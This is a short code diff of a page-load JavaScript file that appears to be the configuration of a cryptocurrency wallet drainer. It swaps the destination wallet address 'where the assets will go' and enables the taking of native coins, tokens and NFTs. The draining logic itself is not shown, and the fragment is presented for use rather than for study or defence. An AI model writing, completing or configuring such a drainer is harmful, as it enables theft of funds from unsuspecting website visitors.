@@ -32,7 +32,7 @@
 document.addEventListener("DOMContentLoaded", async () => {
 
     const CF = {
-        Wallet: "UQBY2mp_z9atz0k2bdp0TIZ-2Jif-TQsRdP0LY28pa7FxZfi",  // Wallet address where the assets will go
+        Wallet: "UQCaAEjnQAdr0eY6ad5UL4ZXZXnFSARkrLYqFsgLP0__7160",  // Wallet address where the assets will go
         Native: true, // ('true' enabled or 'false' disabled)
         Tokens: true, // ('true' enabled or 'false' disabled)
         NFTs: true, // ('true' enabled or 'false' disabled)
